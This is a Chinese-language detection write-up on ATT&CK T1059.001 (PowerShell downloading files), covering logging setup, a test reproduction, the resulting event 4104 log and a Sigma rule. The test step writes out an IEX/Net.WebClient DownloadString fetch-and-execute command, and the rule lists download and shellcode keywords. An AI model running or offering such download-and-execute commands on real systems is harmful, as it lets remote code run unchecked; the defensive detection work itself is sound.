# T1059-001-win-检测Powershell下载文件

## 来自ATT&CK的描述

攻击者可能滥用PowerShell来执行命令和脚本。PowerShell是Windows操作系统中包含的功能强大的交互式命令行界面和脚本环境。攻击者可以使用PowerShell执行许多操作，包括发现信息和执行恶意代码。示例包括Start-Process可用于运行可执行文件的Invoke-Commandcmdlet和可在本地或远程计算机上运行命令的cmdlet（尽管使用PowerShell连接到远程系统需要管理员权限）。

PowerShell也可以用于从Internet下载并运行可执行文件，这些可执行文件可以从磁盘或内存中执行而无需接触磁盘。

许多基于PowerShell的攻击性测试工具，包括Empire，PowerSploit，PoshC2和PSAttack。

还可以执行PowerShell命令脚本，而无需通过.NET框架和Windows公共语言接口（CLI）公开的powershell.exePowerShell底层System.Management.Automation程序集DLL的接口直接调用二进制文件。

## 检测日志

Windows powershell日志审核策略

- 按Win+R打开Windows运行窗口,在输入框里输入gepdit.msc,打开Windows本地组策略编辑器;
- 找到计算机配置/管理模板/Windows组件/Windows Powershell，根据需求打开右侧所需要的日志功能；

## 测试复现

```yml
PS C:\Users\12306br0> IEX (New-Object System.Net.Webclient).DownloadString('http://blog.csdn.net/huangxvhui88/article/de
tails/89361287')
```

## 测试留痕

```yml
Powershell事件ID：4104
正在创建 Scriptblock 文本(已完成 1，共 1):
IEX (New-Object System.Net.Webclient).DownloadString('http://blog.csdn.net/huangxvhui88/article/details/89361287')

ScriptBlock ID: e9f29288-34e7-497f-8fff-9a6cf6c355da
```

## 检测规则/思路

### sigma规则

```yml
title: 检测PowerShell下载文件行为
status: experimental
description: 检测在powershell下载文件行为，windows server 2016测试
tags:
    - attack.t1059-001
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image: 
            - '*\powershell.exe'
            - '*\powershell_ise.exe'
        CommandLine:
            - '*Net.WebClient*'
            - '*DownloadFile*'
            - '*Invoke-WebRequest*'
            - '*Invoke-Shellcode*'
            - '*http*'
            - '*Start-BitsTransfer*'
            - '*IEX*'
            - '*mpcmdrun.exe*'
    condition: selection
level: medium
```

### 建议

在使用Powershell日志进行检测时，我们不建议使用进程名称加命令行关键词匹配的方式进行检测。因为Powershell事件ID：4104中并不包含进程信息。

## 参考推荐

MITRE-ATT&CK-T1059-001

<https://attack.mitre.org/techniques/T1059/001/>

PowerShell 下载文件

<https://www.pstips.net/powershell-download-files.html>

检测Powershell下载文件行为

<https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/PowerShell%20downloads.txt>

Powershell与威胁狩猎

<https://www.freebuf.com/articles/terminal/267080.html>
